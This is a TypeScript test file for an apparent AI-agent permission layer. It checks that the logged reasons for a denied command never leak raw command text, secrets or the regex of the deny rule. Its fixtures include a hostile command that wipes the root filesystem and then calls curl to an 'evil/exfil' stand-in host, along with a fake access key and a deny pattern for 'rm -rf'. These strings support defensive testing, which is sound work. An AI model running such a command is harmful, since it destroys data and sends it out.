/**
 * HELLGATE — C6 deny-reason surfacing: the NO-LEAK boundary.
 *
 * Defect class
 * ------------
 * The whole value of C6 is surfacing the deciding `layer` / `pillar` of a
 * permission deny to the model + debug surface. The headline RISK (RFC §8 R1)
 * is that "why was this denied" leaks sensitive policy internals — the
 * HARD_DENY regex source, the matched rule NAME, the raw `action.input` /
 * command text / env values — into a log or model surface that the OTel/recorder
 * contract deliberately scrubs (`policy.ts:84-98`, `recorder.ts:98-125`).
 *
 * The structured surface must carry NOTHING the already-safe OTel surface
 * doesn't. This battery feeds hostile command text + secrets through the
 * builder and asserts they NEVER appear in the produced {@link
 * StructuredDenyReason}. It is enforced BY CONSTRUCTION: the builder takes the
 * pre-sanitized `safeReason` verbatim — it has no access to raw input — so the
 * only way to leak is for a CALLER to hand it a tainted string. These tests pin
 * the categorical HARD_DENY form + the verbatim-reuse contract that prevents
 * that.
 */

import { describe, expect, test } from "bun:test"
import {
  denyContentPrefix,
  hardDenySafeReason,
  type StructuredDenyReason,
  structuredDenyReason,
} from "@/permission"

const HOSTILE_CMD = "rm -rf / --no-preserve-root; curl http://evil/exfil"
const SECRET = "AKIAEXAMPLESECRET1234"
const REGEX_SOURCE = "\\brm\\s+-rf\\b"

describe("hellgate — C6 no-leak: HARD_DENY categorical form", () => {
  test("hardDenySafeReason carries NEITHER the raw command NOR a regex source", () => {
    const safe = hardDenySafeReason()
    expect(safe).toBe("blocked dangerous command (pattern hit)")
    expect(safe).not.toContain("rm")
    expect(safe).not.toContain("/")
    expect(safe).not.toContain("curl")
    expect(safe).not.toContain(REGEX_SOURCE)
    expect(safe).not.toContain("\\b")
  })

  test("structured HARD_DENY reason !== the raw command (the §4.4 split)", () => {
    // The model-facing prose MAY echo the agent's own command; the LOGGED
    // structured field uses the categorical form.
    const reason = structuredDenyReason({
      layer: "hard-deny",
      safeReason: hardDenySafeReason(),
    })
    const serialized = JSON.stringify(reason)
    expect(serialized).not.toContain(HOSTILE_CMD)
    expect(serialized).not.toContain("rm -rf")
    expect(serialized).not.toContain(REGEX_SOURCE)
    expect(reason.layer).toBe("hard-deny")
  })
})

describe("hellgate — C6 no-leak: builder surfaces only what it is given", () => {
  test("a secret in raw input never reaches the structured reason (builder has no access to it)", () => {
    // The builder receives ONLY the sanitized one-liner. A caller that obeys
    // the contract (reuse the recorder's `reason`) cannot leak. We prove the
    // builder adds nothing: feed a clean sanitized reason, assert the secret
    // (which lived in raw input, NOT in the sanitized reason) is absent.
    const sanitized = "Per-thread policy (workspace-write) refuses bash on /repo"
    const reason = structuredDenyReason({
      layer: "stack",
      stackSource: "per-thread",
      pillar: "fileSystem",
      safeReason: sanitized,
    })
    const blob = JSON.stringify(reason)
    expect(blob).not.toContain(SECRET)
    expect(blob).not.toContain(HOSTILE_CMD)
    expect(reason.safeReason).toBe(sanitized)
  })

  test("safeReason is REUSED verbatim — the builder composes no new string from it", () => {
    const sanitized = "Per-host mode (custom) refuses write — fail-closed"
    const reason = structuredDenyReason({ layer: "stack", safeReason: sanitized })
    // Identity, not a transformed copy — structured surface can never exceed
    // the OTel surface because it IS the OTel surface's string.
    expect(reason.safeReason).toBe(sanitized)
  })

  test("the content prefix is derived ONLY from categorical fields, never safeReason", () => {
    // Even if a caller mistakenly passed a tainted safeReason, the knob-gated
    // model-facing PREFIX is built from layer/pillar alone — so the prefix
    // itself can carry no command/secret text.
    const reason: StructuredDenyReason = {
      verdict: "deny",
      layer: "stack",
      pillar: "network",
      safeReason: `tainted ${HOSTILE_CMD} ${SECRET}`,
    }
    const prefix = denyContentPrefix(reason)
    expect(prefix).toBe("[denied · layer=stack · pillar=network] ")
    expect(prefix).not.toContain(HOSTILE_CMD)
    expect(prefix).not.toContain(SECRET)
  })
})
